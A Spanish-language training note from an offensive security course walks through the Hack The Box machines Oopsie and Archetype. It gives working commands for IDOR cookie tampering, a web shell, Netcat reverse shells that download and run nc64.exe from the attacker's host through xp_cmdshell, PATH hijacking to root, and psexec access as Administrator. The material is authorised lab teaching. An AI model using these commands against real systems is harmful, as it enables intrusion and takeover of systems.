---
tags:
- Explotación y escalada
---

# Explotacion Maquinas Locales I

**Explotación de Máquinas Locales I**

*Introducción a plataformas de práctica: HTB Starting Point — Máquinas Oopsie y Archetype*

| **Campo** | **Detalle** |
| --- | --- |
| Sesión | Explotación de Máquinas Locales I |
| Plataforma | Hack The Box — Starting Point (Tier 1) |
| Máquinas trabajadas | Oopsie (Linux) y Archetype (Windows) |
| Instructor | Evolve Academy (sesión guiada; instructor habitual del bloque ofensivo) |
| Fecha | 15/06/2026 |
| Máster | Ciberseguridad Ofensiva — Evolve Academy |

| **Nota sobre el instructor**  El nombre del instructor no se identifica de forma explícita en la transcripción. Se mencionan los nombres Yuba, Castillo y Carlos en el contexto de otras clases, pero no como ponente de esta sesión. Verifica el dato si necesitas atribuirlo. |
| --- |

# **1. Objetivos de la sesión**

- Repasar la explotación completa de la máquina Oopsie (Linux) desde el acceso web hasta root.
- Aprender la explotación completa de la máquina Archetype (Windows) basada en SMB y Microsoft SQL Server.
- Practicar la obtención de una shell interactiva tras una reverse shell básica.
- Comprender dos técnicas de escalada de privilegios: secuestro de PATH en binario SUID/de grupo (Linux) y abuso de xp\_cmdshell con credenciales de administrador (Windows).
- Conocer herramientas de automatización de la enumeración para escalada de privilegios: LinPEAS y WinPEAS.

# **2. Conceptos clave**

## **IDOR (Insecure Direct Object Reference)**

Vulnerabilidad de control de acceso en la que la aplicación expone una referencia directa a un objeto (por ejemplo un id en la URL o en una cookie) sin comprobar si el usuario tiene permiso sobre ese objeto. Cambiando el identificador se accede a datos de otros usuarios. Aparece en el **OWASP Top 10 (edición 2021)** y, según el instructor, es extremadamente común en entornos reales.

| **Idea central del IDOR visto en clase**  En Oopsie, la cuenta de invitado (guest) tiene id = 2 y la cuenta de administrador tiene id = 1.  La aplicación asume que «como no existe ningún id = 1 visible, está protegido», pero no lo está: basta con cambiar el número para ver datos de administrador.  Modificando la cookie con el role y el id de admin se obtiene acceso al panel de administración. |
| --- |

## **Web shell y reverse shell**

- **Web shell**: archivo (por ejemplo en PHP) que se sube al servidor y, al ser interpretado, permite ejecutar comandos en el servidor desde el navegador.
- **Reverse shell**: el servidor objetivo inicia una conexión de vuelta hacia la máquina del atacante, que mantiene un puerto a la escucha. Es la forma habitual de conseguir una shell de sistema.

| **Detección de subida no interpretada**  Si al abrir el PHP subido el navegador muestra el código fuente en lugar de ejecutarlo, el servidor NO lo está interpretando como PHP. Si lo ejecuta (y muestra el resultado del comando), la subida es explotable. |
| --- |

## **Shell interactiva (TTY upgrade)**

Una reverse shell básica es incómoda: no permite moverse bien con las flechas, no muestra el usuario, el host ni el directorio actual y algunos comandos se interrumpen. La «shell interactiva» (TTY completa) mejora la experiencia. La secuencia vista en clase tiene tres pasos.

## **Reutilización de credenciales**

Principio recurrente: toda credencial encontrada (usuario, contraseña, hash) debe probarse contra otros servicios y usuarios. En Oopsie, la contraseña hallada en la configuración de la base de datos sirve directamente para el usuario del sistema robert.

## **SMB y sesión nula**

SMB (puerto 445) es el protocolo de compartición de archivos de Windows. A veces permite enumeración mediante **sesión nula** (null session): sin usuario y sin contraseña. Siempre debe enumerarse con cuidado porque suele contener archivos de configuración con credenciales.

## **Microsoft SQL Server y xp\_cmdshell**

MSSQL escucha en el puerto 1433. Si se obtienen credenciales con rol sysadmin, puede activarse el procedimiento extendido xp\_cmdshell, que permite ejecutar comandos del sistema operativo desde SQL. Es la vía para «escapar» de la consola SQL hacia una shell de Windows real.

# **3. Desarrollo técnico — Máquina Oopsie (Linux)**

| **Flujo general de Oopsie** |
| --- |
| **Escaneo Nmap** | **→** | **Enum. web + IDOR** | **→** | **Web/Reverse shell** | **→** | **Shell interactiva** | **→** | **Escalada a robert** | **→** | **Escalada a root (PATH hijack)** |

## **3.1. Escaneo y enumeración web**

Tras el escaneo con Nmap se observan dos puertos abiertos: 22 (SSH) y 80 (HTTP). Se inspecciona la web con herramientas de identificación de tecnologías como **Wappalyzer** y **WhatWeb** (en la transcripción aparece como «WattWeb», error de transcripción), detectando Apache y HTML5.

Revisando el código fuente y los scripts JavaScript de la página se localiza una ruta CDN poco habitual y finalmente un login que permite entrar como invitado (guest).

| **Buenas prácticas de enumeración web vistas**  Inspeccionar el código fuente y los scripts .js: a menudo esconden rutas o endpoints internos.  Si en la URL aparece un número (por ejemplo id=2), probar siempre a cambiarlo (subirlo o ponerlo a 1).  Si existe una página con un nombre de dominio propio que no resuelve, recordar la técnica de añadirla a /etc/hosts (no fue necesaria aquí). |
| --- |

## **3.2. Explotación del IDOR y robo de cookie**

Logueados como guest (id = 2, role = guest), se inspecciona la petición y se localizan los parámetros role y id en la cookie. Cambiando id a 1 se descubre la cuenta y el correo de admin. Sustituyendo en la cookie role=admin y el id correspondiente, se obtiene acceso a las secciones bloqueadas (por ejemplo «Uploads»).

## **3.3. Subida de web shell y reverse shell**

Con acceso de admin se sube primero una **web shell** en PHP. El problema es localizar la ruta de subida: no se permite listar el directorio, así que hay que conocer el nombre del archivo subido. Se usa fuzzing de directorios con **Feroxbuster** (también se mencionan Gobuster y dirsearch) y se descubre la carpeta de subidas (uploads).

Verificada la ejecución de comandos vía web shell, se prepara una reverse shell: se edita la IP del atacante y el puerto de escucha, se deja Netcat a la escucha y se sube/ejecuta la reverse shell, que devuelve la conexión.

| # IP del atacante y puerto de escucha usados en clase  IP = 10.10.15.82 PUERTO = 4444  # Listener en la máquina atacante  nc -lvnp 4444 |
| --- |
| **Solo en laboratorio autorizado**  El uso de web shells y reverse shells está orientado exclusivamente a las máquinas de Hack The Box y entornos de práctica autorizados. No debe replicarse contra sistemas reales sin autorización expresa. |

## **3.4. Obtención de la flag de usuario y shell interactiva**

Una vez dentro como el usuario de servicio web (www-data) se obtiene la primera flag:

| cat user.txt |
| --- |

Para mejorar la shell se realiza el upgrade a TTY interactiva con los tres pasos clásicos:

| python3 -c 'import pty; pty.spawn("/bin/bash")'  # Pulsar Ctrl+Z para suspender la shell  stty raw -echo; fg  # Pulsar Enter una o dos veces |
| --- |
| **Resultado de la shell interactiva**  Tras el upgrade la terminal muestra usuario, host y directorio actual, permite moverse entre directorios con las flechas y deja de interrumpir comandos. Es mucho más cómoda para la fase de escalada. |

## **3.5. Escalada de www-data a robert**

Se exploran los archivos de la web en la ruta habitual /var/www/. En la carpeta del CGI se encuentran admin.php, db.php e index.php. El archivo db.php contiene la cadena de conexión a la base de datos local con el usuario robert y su contraseña.

| cd /var/www  ls  cat cdn-cgi/login/db.php # contiene usuario robert y contraseña |
| --- |

Aplicando reutilización de credenciales se cambia al usuario robert (existe en /home):

| su robert # introducir la contraseña encontrada en db.php |
| --- |
| **Nota sobre los puertos internos**  La base de datos no es accesible desde el exterior: el escaneo solo mostró 22 y 80 abiertos. MySQL está en local. Regla recordada en clase: solo puedes explotar directamente los puertos que están abiertos hacia el exterior. Los puertos internos se verán una vez dentro de la máquina. |

## **3.6. Escalada de robert a root (secuestro de PATH)**

Con el usuario robert se ejecuta id y se descubre la pertenencia al grupo bugtracker. Se buscan archivos cuyo dueño/grupo sea ese grupo:

| find / -group bugtracker 2>/dev/null |
| --- |

Aparece un binario en /usr/bin/bugtracker. Con ls -lh se ve que pertenece al grupo bugtracker pero se ejecuta como root (SUID). Con strings y file se analiza su contenido y se observa que pide un id y ejecuta un cat sobre un informe en /root/reports/, usando **cat sin ruta absoluta**.

| ls -lh /usr/bin/bugtracker  file /usr/bin/bugtracker  strings /usr/bin/bugtracker |
| --- |

Como el binario invoca cat sin ruta absoluta y se ejecuta como root, se secuestra el PATH para que ejecute un cat malicioso que lance una shell:

| cd /tmp  echo '/bin/sh' > cat  chmod +x cat  export PATH=/tmp:$PATH  /usr/bin/bugtracker # pedir un id cualquiera |
| --- |
| **Resultado: shell como root**  Al ejecutarse, el binario busca cat primero en /tmp (por el PATH modificado), encuentra el cat malicioso y abre /bin/sh como root.  Para leer la flag NO se puede usar cat (ya no es el cat real): se usa otro comando, por ejemplo nano root.txt o cualquier alternativa equivalente.  cd /root y lectura de root.txt completan la máquina. |

## **3.7. Explicación complementaria — ¿por qué funciona el secuestro de PATH?**

| **Explicación añadida para mejorar la comprensión (no literal de la transcripción)**  Cuando un programa llama a un comando como cat sin indicar su ruta absoluta, el sistema lo busca recorriendo los directorios listados en la variable PATH, en orden.  Por defecto PATH empieza por /usr/local/bin, /usr/bin, /bin… donde está el cat legítimo.  Al anteponer /tmp al PATH, el sistema encuentra antes nuestro cat falso. Como el binario corre como root, nuestro cat (que lanza /bin/sh) también corre como root.  Esta técnica solo funciona porque el binario usa una ruta relativa para el comando; los binarios bien programados usan rutas absolutas. |
| --- |

# **4. Desarrollo técnico — Máquina Archetype (Windows)**

| **Flujo general de Archetype** |
| --- |
| **Nmap (445, 1433)** | **→** | **SMB sesión nula** | **→** | **Credenciales en backups** | **→** | **Acceso a MSSQL** | **→** | **xp\_cmdshell** | **→** | **Reverse shell + WinPEAS** |

## **4.1. Escaneo inicial**

El escaneo Nmap revela mucho tráfico SMB. Puertos interesantes: 445 (SMB) y 1433 (Microsoft SQL Server). No hay web relevante. Consejo del instructor: mientras corre el escaneo, probar siempre FTP (sesiones anónimas) y la web si existieran.

## **4.2. Enumeración SMB con sesión nula**

Con el puerto 445 abierto se enumera SMB sin credenciales (sesión nula) usando **smbclient** (también se menciona smbmap):

| # Listar recursos compartidos sin usuario ni contraseña (sesión nula)  smbclient -N -L //IP/  # Conectarse a un recurso concreto (sin la opción -L)  smbclient -N //IP/backups |
| --- |

Aparecen recursos como ADMIN, backups y C. En ADMIN/C no hay acceso, pero en backups sí. La conexión funciona como una consola tipo FTP (comandos help, dir, get). Se descarga el archivo de configuración encontrado:

| dir  get prod.dtsConfig # archivo de configuración con credenciales |
| --- |
| **Regla nemotécnica del instructor**  Todo archivo que empiece o termine por «config» «huele muy mal»: suele contener usuario y contraseña. En este caso el archivo contiene un usuario de SQL y su contraseña, además del nombre del host. |

## **4.3. Acceso a MSSQL con Impacket**

Con las credenciales de SQL se usa el conjunto de herramientas **Impacket** (colección en Python para trabajar sobre protocolos de red). La herramienta concreta es mssqlclient.py con autenticación de Windows:

| impacket-mssqlclient NOMBREMAQUINA/usuario@IP -windows-auth |
| --- |
| **Instalación de Impacket (si no viene en Kali)**  Las versiones recientes de Kali ya lo incluyen.  Si no: git clone del repositorio y luego instalación con el setup del proyecto (python3 setup.py install / pip install). |

Impacket incluye muchas utilidades mencionadas en clase, entre ellas:

- psexec.py / smbexec.py: ejecución remota de comandos.
- secretsdump.py: vuelca todos los hashes del dominio si tienes credenciales de administrador de dominio (todos los usuarios del Active Directory, hasheados, para crackear después).
- mssqlclient.py: cliente de Microsoft SQL Server (el usado aquí).

## **4.4. Comprobación de privilegios y activación de xp\_cmdshell**

Dentro de MSSQL se comprueba si el usuario es administrador del servidor (sysadmin). Las respuestas SQL son booleanas: 1 = true, 0 = false.

| SELECT IS\_SRVROLEMEMBER('sysadmin'); -- devuelve 1 => somos sysadmin |
| --- |

Al ser sysadmin se puede activar xp\_cmdshell. Por defecto está deshabilitado, así que primero hay que habilitar las opciones avanzadas y luego el propio procedimiento, reconfigurando tras cada cambio:

| EXEC sp\_configure 'show advanced options', 1;  RECONFIGURE;  EXEC sp\_configure 'xp\_cmdshell', 1;  RECONFIGURE;  -- Ya se pueden ejecutar comandos del sistema:  EXEC xp\_cmdshell 'whoami'; |
| --- |
| **Qué se consigue con xp\_cmdshell**  Permite ejecutar comandos del sistema operativo Windows desde la consola de SQL. Es la vía para «escapar» de SQL: pasar de una conexión limitada a la base de datos a una ejecución de comandos en el sistema. |

## **4.5. Transferencia de Netcat y reverse shell**

Windows no trae Netcat por defecto, así que se transfiere desde la máquina atacante. Se levanta un servidor web con Python en el directorio donde están las herramientas:

| python3 -m http.server 80 # publica el directorio actual |
| --- |

Desde la víctima, vía xp\_cmdshell, se descarga Netcat con PowerShell y se guarda en C:\Users\Public (carpeta con permisos para todos):

| EXEC xp\_cmdshell 'powershell wget http://10.10.15.82/nc64.exe -OutFile C:\Users\Public\nc64.exe';  -- Listener en la máquina atacante:  nc -lvnp 4444  -- Ejecutar Netcat en la víctima para devolver la shell:  EXEC xp\_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe 10.10.15.82 4444'; |
| --- |
| **Detalle importante: CMD vs PowerShell**  wget en este contexto es un alias de PowerShell; falla si se lanza en CMD pura. Por eso se descarga con PowerShell y se ejecuta con CMD.  La opción -e de Netcat indica con qué programa ejecutar la conexión (cmd.exe o powershell.exe).  La carpeta C:\Users\Public se usa porque todos los usuarios tienen permiso de escritura/ejecución (equivalente a /tmp en Linux). |

Como alternativa a Netcat se mencionó usar una reverse shell de PowerShell generada (estilo Invoke-PowerShellTcp / nishang), descomentando la última línea y poniendo IP y puerto del atacante. La flag de usuario se obtiene en el escritorio del usuario de servicio SQL:

| cd C:\Users\sql\_svc\Desktop  type user.txt |
| --- |

## **4.6. Escalada a Administrator con WinPEAS**

Para la escalada se transfiere y ejecuta **WinPEAS** (versión Windows de PEAS). Automatiza la enumeración: información del sistema, vulnerabilidades del kernel, configuraciones, antivirus, sesiones de usuario e historial de PowerShell, presentando un informe con colores (lo rojo es lo más importante).

| # Descarga (wget es de PowerShell; usar PowerShell, no CMD pura)  powershell wget http://10.10.15.82/winPEASx64.exe -OutFile winpeas.exe  .\winpeas.exe |
| --- |
| **Hallazgo decisivo en el historial de PowerShell**  WinPEAS detecta el historial de comandos de PowerShell del usuario.  En ese historial aparece un comando de backup ejecutado con el usuario Administrator y su contraseña en texto claro (Mega\*\*\*).  Con esas credenciales ya se puede iniciar sesión como Administrator. |

Para obtener la shell como administrador se usa psexec.py de Impacket (también valdría **evil-winrm**):

| impacket-psexec administrator:'CONTRASEÑA'@IP  # o, con evil-winrm:  evil-winrm -i IP -u administrator -p 'CONTRASEÑA' |
| --- |

La flag de root está en el escritorio del administrador:

| cd C:\Users\Administrator\Desktop  type root.txt |
| --- |

# **5. Herramientas utilizadas en la sesión**

| **Herramienta** | **Objetivo** | **Fase** | **Comando o uso visto** | **Nivel** | **Notas** |
| --- | --- | --- | --- | --- | --- |
| Nmap | Detectar puertos y servicios | Enumeración | nmap -sV -p- IP | Recurrente | Primer paso en ambas máquinas |
| Wappalyzer / WhatWeb | Identificar tecnologías web | Enum. web | whatweb URL | Introducida | En transcripción aparece «WattWeb» (error) |
| Feroxbuster | Fuzzing de directorios | Enum. web | feroxbuster -u URL | Practicada | Localiza la carpeta uploads en Oopsie |
| Gobuster / dirsearch | Fuzzing de directorios | Enum. web | gobuster dir -u URL -w dic | Introducida | Alternativas a Feroxbuster |
| Netcat | Listener y transferencia | Explotación / shell | nc -lvnp 4444 | Practicada | En Windows hay que transferir nc64.exe |
| Python http.server | Servir archivos por HTTP | Transferencia | python3 -m http.server 80 | Practicada | Para que la víctima descargue herramientas |
| pty / stty (TTY upgrade) | Shell interactiva | Post-explotación | python3 -c 'pty.spawn...' | Introducida | Tres pasos: pty + Ctrl+Z + stty raw -echo; fg |
| find | Buscar por grupo/permiso | Escalada (Linux) | find / -group bugtracker | Practicada | Clave para hallar el binario SUID |
| strings / file | Analizar binarios | Escalada (Linux) | strings /usr/bin/bugtracker | Practicada | Revela el cat sin ruta absoluta |
| export PATH | Secuestro de PATH | Escalada (Linux) | export PATH=/tmp:$PATH | Introducida | Técnica de cat malicioso |
| smbclient | Enumerar/acceder a SMB | Enumeración | smbclient -N -L //IP/ | Practicada | Sesión nula con -N |
| Impacket (suite) | Trabajar protocolos de red | Varias | impacket-mssqlclient ... | Introducida | Colección Python; incluye psexec, secretsdump |
| mssqlclient.py | Cliente MSSQL | Explotación | ... -windows-auth | Introducida | Acceso a SQL Server (1433) |
| xp\_cmdshell | Ejecutar comandos vía SQL | Explotación | EXEC xp\_cmdshell 'whoami' | Introducida | Requiere rol sysadmin; activar con sp\_configure |
| WinPEAS / LinPEAS | Enumeración automática | Escalada | .\winpeas.exe | Introducida | Informe con colores; lo rojo es prioritario |
| psexec.py | Ejecución remota | Escalada (Windows) | impacket-psexec admin:pass@IP | Introducida | Acceso final como Administrator |
| evil-winrm | Shell remota WinRM | Escalada (Windows) | evil-winrm -i IP -u .. -p .. | Practicada | Alternativa a psexec |

| **Herramientas mencionadas pero no desarrolladas en profundidad**  secretsdump.py, smbmap, Mimikatz y las reverse shells de PowerShell (estilo nishang/Invoke-PowerShellTcp) se citan en la sesión pero no se desarrollan paso a paso en el material proporcionado. |
| --- |

# **6. Comandos importantes (resumen)**

## **Oopsie (Linux)**

| nc -lvnp 4444  cat user.txt  python3 -c 'import pty; pty.spawn("/bin/bash")'  stty raw -echo; fg  cat /var/www/cdn-cgi/login/db.php  su robert  id  find / -group bugtracker 2>/dev/null  strings /usr/bin/bugtracker  cd /tmp; echo '/bin/sh' > cat; chmod +x cat; export PATH=/tmp:$PATH  /usr/bin/bugtracker |
| --- |

## **Archetype (Windows)**

| smbclient -N -L //IP/  smbclient -N //IP/backups  impacket-mssqlclient NOMBRE/usuario@IP -windows-auth  SELECT IS\_SRVROLEMEMBER('sysadmin');  EXEC sp\_configure 'show advanced options', 1; RECONFIGURE;  EXEC sp\_configure 'xp\_cmdshell', 1; RECONFIGURE;  EXEC xp\_cmdshell 'whoami';  python3 -m http.server 80  EXEC xp\_cmdshell 'powershell wget http://IP/nc64.exe -OutFile C:\Users\Public\nc64.exe';  EXEC xp\_cmdshell 'C:\Users\Public\nc64.exe -e cmd.exe IP 4444';  impacket-psexec administrator:'PASS'@IP |
| --- |

# **7. Riesgos, errores comunes y buenas prácticas**

| **Alcance y autorización**  Todas las técnicas son para máquinas de Hack The Box y laboratorios autorizados. Subir web shells, abusar de xp\_cmdshell o secuestrar el PATH en sistemas reales sin permiso es ilegal. |
| --- |
| **Errores comunes vistos en clase**  Olvidar dejar el listener (nc -lvnp) a la escucha antes de lanzar la reverse shell.  Lanzar wget en CMD pura cuando es un alias de PowerShell (falla la descarga).  Intentar leer la flag con cat tras secuestrar el PATH (cat ya no funciona: usar nano u otro).  Asumir que la base de datos es accesible desde fuera: solo se explotan los puertos abiertos al exterior. |
| **Buenas prácticas**  Organizar el trabajo en carpetas por máquina y guardar todos los escaneos.  Anotar y reutilizar todas las credenciales encontradas (crear un diccionario propio).  Inspeccionar siempre código fuente, scripts y archivos \*config\*.  En escalada, revisar siempre sudo -l, id (grupos) y permisos antes de complicarse. |

# **8. Conexión con sesiones anteriores**

- Enumeración con Nmap y fuzzing web (Feroxbuster, Gobuster, dirsearch, ffuf): ya practicados; aquí se aplican como primer paso en ambas máquinas.
- SMB y smbclient: vistos antes muy por encima; en Archetype se profundiza con la enumeración por sesión nula (-N).
- Reverse shells y Netcat: ya trabajados en máquinas anteriores; se enlazan con la nueva idea de shell interactiva (TTY upgrade).
- Reutilización de credenciales: principio recurrente del máster, clave tanto en Oopsie (db.php → robert) como en Archetype (config → SQL → historial → Administrator).
- Continúa la progresión por HTB Starting Point (Meow → Three vistas previamente; Oopsie y Archetype amplían el Tier 1 con escalada de privilegios Linux y Windows).

# **9. Resumen final**

La sesión cubrió la explotación completa de dos máquinas de HTB Starting Point. En Oopsie (Linux), el acceso inicial se logró abusando de un IDOR para suplantar al administrador mediante manipulación de cookie, subiendo una web shell y obteniendo una reverse shell; la escalada se hizo reutilizando credenciales de db.php (a robert) y secuestrando el PATH de un binario que se ejecutaba como root (a root).

En Archetype (Windows), la enumeración SMB por sesión nula reveló un archivo de configuración con credenciales de SQL; con Impacket se accedió a MSSQL, se verificó el rol sysadmin y se activó xp\_cmdshell para ejecutar comandos y obtener una reverse shell con Netcat; WinPEAS reveló la contraseña de Administrator en el historial de PowerShell, completando la escalada con psexec/evil-winrm.

# **10. Checklist de repaso**

- ☐ Sé identificar y explotar un IDOR (cambiar id/role en URL o cookie).
- ☐ Sé subir una web shell y verificar si el servidor interpreta el PHP.
- ☐ Sé montar una reverse shell con listener (nc -lvnp) e IP/puerto correctos.
- ☐ Sé hacer el upgrade a shell interactiva (pty + Ctrl+Z + stty raw -echo; fg).
- ☐ Sé buscar archivos por grupo con find y analizar binarios con strings/file.
- ☐ Entiendo y sé ejecutar el secuestro de PATH (cat malicioso) para escalar a root.
- ☐ Sé enumerar SMB por sesión nula con smbclient -N y descargar archivos config.
- ☐ Sé conectarme a MSSQL con Impacket y comprobar el rol sysadmin.
- ☐ Sé activar y usar xp\_cmdshell para ejecutar comandos del sistema.
- ☐ Sé transferir Netcat/WinPEAS con python http.server + wget de PowerShell.
- ☐ Sé interpretar el informe de WinPEAS/LinPEAS (prioridad a lo rojo).
- ☐ Sé usar psexec.py o evil-winrm con credenciales de Administrator.

# **11. Actualización del registro de herramientas**

Sección lista para copiar a la base de conocimiento del proyecto. Cambios de nivel y altas tras esta sesión:

| **Herramienta** | **Nivel anterior** | **Nivel tras esta sesión** | **Motivo** |
| --- | --- | --- | --- |
| Feroxbuster | Introduced | Practiced | Usada para localizar uploads en Oopsie |
| smbclient | Practiced | Practiced (reforzada) | Enumeración por sesión nula -N |
| Netcat | — | Practiced | Listener y transferencia en ambas máquinas |
| evil-winrm | Practiced | Practiced (reforzada) | Alternativa de acceso como Administrator |
| Metasploit | Introduced | Introduced | Solo mencionado (HackTricks) |
| Impacket (suite) | Nueva | Introduced | mssqlclient, psexec, secretsdump |
| mssqlclient.py | Nueva | Introduced | Acceso a MSSQL con -windows-auth |
| xp\_cmdshell | Nueva | Introduced | Ejecución de comandos vía SQL Server |
| WinPEAS / LinPEAS | Nueva | Introduced | Enumeración automática para escalada |
| WhatWeb / Wappalyzer | Nueva | Introduced | Identificación de tecnologías web |
| Python http.server | Nueva | Practiced | Servidor de transferencia de archivos |
| TTY upgrade (pty/stty) | Nueva | Introduced | Shell interactiva tras reverse shell |
| PATH hijacking | Nueva (técnica) | Introduced | Escalada vía cat malicioso |

| **Nuevas técnicas para el registro conceptual**  IDOR (OWASP A01:2021) — control de acceso roto vía manipulación de id/cookie.  Secuestro de PATH sobre binario que se ejecuta como root con comando relativo.  Activación de xp\_cmdshell en MSSQL con rol sysadmin (sp\_configure + RECONFIGURE).  Credenciales en historial de PowerShell como vector de escalada en Windows. |
| --- |
